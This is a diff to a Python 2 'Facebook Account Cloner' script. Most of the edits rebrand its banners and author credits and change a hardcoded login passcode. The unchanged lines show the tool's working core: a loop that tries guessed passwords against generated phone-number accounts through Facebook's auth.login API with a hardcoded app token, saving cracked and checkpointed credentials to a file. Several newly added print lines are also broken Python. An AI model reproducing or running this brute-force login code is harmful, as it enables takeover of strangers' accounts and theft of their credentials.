@@ -90,14 +90,13 @@ print  """
 \x1b[1;93m    ██████╦╝██║\x1b[1;93m██║░╚██╗██║
 \x1b[1;93m   ╚═════╝░╚═╝\x1b[1;93m╚═╝░░╚═╝╚═╝
     """
-print '\x1b[1;96m    Dalkhor Facebook Account Cloner'
-print '\x1b[1;92m╔════════════════════╗'
-print'\x1b[1;92m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫: Biki Mahamood║'
-print'\x1b[1;92m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: Biki Mahamood║'
-print'\x1b[1;92m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: Biki Mahamood║'
-print'\x1b[1;92m ║✯𝐆𝐢𝐭𝐇𝐮𝐛: biki-cyber404║'
-time.sleep(0.05)    
-print'\x1b[1;92m ╚════════════════════╝'
+print '\x1b[1;93m    Dalkhor Facebook Account Cloner'
+print\033[1;92m-----------------------------------------------
+print\033[1;92m>> AUTHOR : BIKI HACKER
+print\033[1;92m>> FACEBOOK : BIKI MAHMOOD
+print\033[1;92m>> YOUTUBE : BIKI MAHMOOD
+print\033[1;92m>> GITHUB : BikiCyber404
+print\033[1;92m-----------------------------------------------"""
 time.sleep(0.05)    
 print'                                        '
 jalan("\x1b[1;92mINPUT USERNAME & PASSWORD")
@@ -105,7 +104,7 @@ print 25* '\033[1;96m-'
 print'                                        '
 
 CorrectUsername = "BIKI"
-CorrectPasscode = "HACKER"
+CorrectPasscode = "OYON"
 
 loop = 'true'
 while (loop == 'true'):
@@ -153,13 +152,12 @@ def login():
 \x1b[1;93m   ╚═════╝░╚═╝\x1b[1;93m╚═╝░░╚═╝╚═╝
     """
     print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-    print '\x1b[1;92m╔════════════════════╗'
-    print'\x1b[1;92m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : Biki Mahamood║'
-    print'\x1b[1;92m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: Biki Mahamood║'
-    print'\x1b[1;92m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: Biki Mahamood║'
-    print'\x1b[1;92m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : biki-cyber404║'
-    time.sleep(0.05)    
-    print '\x1b[1;92m╚════════════════════╝'
+    print\033[1;92m-----------------------------------------------
+    print\033[1;92m>> AUTHOR : BIKI HACKER
+    print\033[1;92m>> FACEBOOK : BIKI MAHMOOD
+    print\033[1;92m>> YOUTUBE : BIKI MAHMOOD
+    print\033[1;92m>> GITHUB : BikiCyber404
+    print\033[1;92m-----------------------------------------------"""
     print '                             '          
     
     jalan("\033[1;93m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m 7 DIGIT CRACKER")
@@ -239,14 +237,13 @@ def Zeek():
 \x1b[1;93m    ██████╦╝██║\x1b[1;93m██║░╚██╗██║
 \x1b[1;93m   ╚═════╝░╚═╝\x1b[1;93m╚═╝░░╚═╝╚═╝
     """
-    print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-    print '\x1b[1;92m╔═══════════════════════════╗'
-    print'\x1b[1;92m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫: Biki Mahamood║'
-    print'\x1b[1;92m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: Biki Mahamood║'
-    print'\x1b[1;92m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: Biki Mahamood║'
-    print'\x1b[1;92m ║✯𝐆𝐢𝐭𝐇𝐮𝐛: biki-cyber404║'
-    time.sleep(0.05)      
-    print '\x1b[1;92m╚═══════════════════════════╝'
+    print '\x1b[1;93m    Pakistani Facebook Account Cloner'
+    print\033[1;92m-----------------------------------------------
+    print\033[1;92m>> AUTHOR : BIKI HACKER
+    print\033[1;92m>> FACEBOOK : BIKI MAHMOOD
+    print\033[1;92m>> YOUTUBE : BIKI MAHMOOD
+    print\033[1;92m>> GITHUB : BikiCyber404
+    print\033[1;92m-----------------------------------------------"""
     print '                                        '
     
     print '\x1b[1;91m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m Jazz'
@@ -280,14 +277,13 @@ def action():
 \x1b[1;93m    ██████╦╝██║\x1b[1;93m██║░╚██╗██║
 \x1b[1;93m   ╚═════╝░╚═╝\x1b[1;93m╚═╝░░╚═╝╚═╝
     """
-        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-        print '\x1b[1;92m╔══════════════════╗'
-        print'\x1b[1;92m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 : Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐆𝐢𝐭𝐇𝐮𝐛: biki-cyber404║'
-        time.sleep(0.05)   
-        print '\x1b[1;92m╚══════════════════╝'
+        print '\x1b[1;93m    Pakistani Facebook Account Cloner'
+        print\033[1;92m-----------------------------------------------
+        print\033[1;92m>> AUTHOR : BIKI HACKER
+        print\033[1;92m>> FACEBOOK : BIKI MAHMOOD
+        print\033[1;92m>> YOUTUBE : BIKI MAHMOOD
+        print\033[1;92m>> GITHUB : BikiCyber404
+        print\033[1;92m-----------------------------------------------"""
         print '                                        ' 
         print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
         print'                                                '    
@@ -315,14 +311,13 @@ def action():
 \x1b[1;93m    ██████╦╝██║\x1b[1;93m██║░╚██╗██║
 \x1b[1;93m   ╚═════╝░╚═╝\x1b[1;93m╚═╝░░╚═╝╚═╝
     """
-        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-        print '\x1b[1;92m╔══════════════════╗'
-        print'\x1b[1;92m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫:  Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐆𝐢𝐭𝐇𝐮𝐛: BikiCyber404║'
-        time.sleep(0.05)    
-        print '\x1b[1;92m╚══════════════════╝'
+        print '\x1b[1;93m    Pakistani Facebook Account Cloner'
+        print\033[1;92m-----------------------------------------------
+        print\033[1;92m>> AUTHOR : BIKI HACKER
+        print\033[1;92m>> FACEBOOK : BIKI MAHMOOD
+        print\033[1;92m>> YOUTUBE : BIKI MAHMOOD
+        print\033[1;92m>> GITHUB : BikiCyber404
+        print\033[1;92m-----------------------------------------------"""
         print '                                        ' 
         print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
         print'                                                '    
@@ -348,14 +343,13 @@ def action():
 \x1b[1;93m    ██████╦╝██║\x1b[1;93m██║░╚██╗██║
 \x1b[1;93m   ╚═════╝░╚═╝\x1b[1;93m╚═╝░░╚═╝╚═╝
     """
-        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-        print '\x1b[1;92m╔═══════════════════╗'
-        print'\x1b[1;92m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐆𝐢𝐭𝐇𝐮𝐛: BikiCyber404║'
-        time.sleep(0.05)    
-        print '\x1b[1;92m╚══════════════════╝'
+        print '\x1b[1;93m    Pakistani Facebook Account Cloner'
+        print\033[1;92m-----------------------------------------------
+        print\033[1;92m>> AUTHOR : BIKI HACKER
+        print\033[1;92m>> FACEBOOK : BIKI MAHMOOD
+        print\033[1;92m>> YOUTUBE : BIKI MAHMOOD
+        print\033[1;92m>> GITHUB : BikiCyber404
+        print\033[1;92m-----------------------------------------------"""
         print '                                        ' 
         print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
         print'                                                '    
@@ -382,14 +376,13 @@ def action():
 \x1b[1;93m    ██████╦╝██║\x1b[1;93m██║░╚██╗██║
 \x1b[1;93m   ╚═════╝░╚═╝\x1b[1;93m╚═╝░░╚═╝╚═╝
     """
-        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-        print '\x1b[1;92m╔═══════════════════╗'
-        print'\x1b[1;92m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐘𝐨𝐮𝐓𝐮𝐛 𝐞: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐆𝐢𝐭𝐇𝐮𝐛: biki-cyber404║'
-        time.sleep(0.05)    
-        print '\x1b[1;92m╚═══════════════════╝'
+        print '\x1b[1;93m    Pakistani Facebook Account Cloner'
+        print\033[1;92m-----------------------------------------------
+        print\033[1;92m>> AUTHOR : BIKI HACKER
+        print\033[1;92m>> FACEBOOK : BIKI MAHMOOD
+        print\033[1;92m>> YOUTUBE : BIKI MAHMOOD
+        print\033[1;92m>> GITHUB : BikiCyber404
+        print\033[1;92m-----------------------------------------------"""
         print '                                        ' 
         print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
         print'                                                '    
@@ -415,14 +408,13 @@ def action():
 \x1b[1;93m    ██████╦╝██║\x1b[1;93m██║░╚██╗██║
 \x1b[1;93m   ╚═════╝░╚═╝\x1b[1;93m╚═╝░░╚═╝╚═╝
     """
-        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-        print '\x1b[1;92m╔═══════════════════╗'
-        print'\x1b[1;92m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: Biki Mahamood ║'
-        print'\x1b[1;92m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: Biki Mahamood║'
-        print'\x1b[1;92m ║✯𝐆𝐢𝐭𝐇𝐮𝐛: biki-cyber404║'
-        time.sleep(0.05)    
-        print'\x1b[1;92m ╚═══════════════════╝'
+        print '\x1b[1;93m    Pakistani Facebook Account Cloner'
+        print\033[1;92m-----------------------------------------------
+        print\033[1;92m>> AUTHOR : BIKI HACKER
+        print\033[1;92m>> FACEBOOK : BIKI MAHMOOD
+        print\033[1;92m>> YOUTUBE : BIKI MAHMOOD
+        print\033[1;92m>> GITHUB : BikiCyber404
+        print\033[1;92m-----------------------------------------------"""
         print '                                        '  
         print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
         print'                                                '    
@@ -462,14 +454,13 @@ def action():
 \x1b[1;93m    ██████╦╝██║\x1b[1;93m██║░╚██╗██║
 \x1b[1;93m   ╚═════╝░╚═╝\x1b[1;93m╚═╝░░╚═╝╚═╝
     """
-    print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-    print '\x1b[1;92m╔═══════════════════╗'
-    print'\x1b[1;92m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫: Biki Mahamood║'
-    print'\x1b[1;92m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: Biki Mahamood║'
-    print'\x1b[1;92m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: Biki Mahamood║'
-    print'\x1b[1;92m ║✯𝐆𝐢𝐭𝐇𝐮𝐛: biki-cyber404║'
-    time.sleep(0.05)    
-    print'\x1b[1;92m ╚═══════════════════╝'
+    print '\x1b[1;93m    Pakistani Facebook Account Cloner'
+    print\033[1;92m-----------------------------------------------
+    print\033[1;92m>> AUTHOR : BIKI HACKER
+    print\033[1;92m>> FACEBOOK : BIKI MAHMOOD
+    print\033[1;92m>> YOUTUBE : BIKI MAHMOOD
+    print\033[1;92m>> GITHUB : BikiCyber404
+    print\033[1;92m-----------------------------------------------"""
     print'                       '
     print'                       '
     jalan ('  \x1b[1;91m[\x1b[1;93m✓\x1b[1;91m]\033[1;92m Total ids number: '+xxx)
@@ -489,14 +480,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m[\x1b[1;92mMS-OK\x1b[1;91m]  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;93m[\x1b[1;92mBIKI-OK\x1b[1;91m]  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('Biki/Mahamood-CP-OK.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;93m[\x1b[1;96mMS-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;93m[\x1b[1;96mBIKI-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass1
                     cps = open('Biki/Mahamood-CP-OK.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -506,14 +497,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;93m[\x1b[1;92mMS-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;93m[\x1b[1;92mBIKI-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass2
                         okb = open('Biki/Mahamood-CP-OK.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;93m[\x1b[1;96mMS-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;93m[\x1b[1;96mBIKI-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass2
                             cps = open('Biki/Mahamood-CP-OK.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -523,14 +514,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;93m[\x1b[1;92mMS-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass3
+                        print '\x1b[1;93m[\x1b[1;92mBIKI-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass3
                         okb = open('Biki/Mahamood-CP-OK.txt', 'a')
                         okb.write(k+c+user+pass3+'\n')
                         okb.close()
                         oks.append(c+user+pass3)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;93m[\x1b[1;96mMS-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass3
+                            print '\033[1;93m[\x1b[1;96mBIKI-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass3
                             cps = open('Biki/Mahamood-CP-OK.txt', 'a')
                             cps.write(k+c+user+pass3+'\n')
                             cps.close()
@@ -563,7 +554,7 @@ def action():
 
 \033[1;92mThanks \033[1;93mUseing My CLONE FB Tool
 \033[1;92m My Faecbook\033[1;93mhttps://m.me/kawsarmisty1257
-\033[1;92mGitHub\033[1;93mrakibmozumdar404"""
+\033[1;92mGitHub\033[1;93mBikiCyber404"""
 
     
     raw_input("\n\033[1;91m[\033[1;92mBack\033[1;91m]")
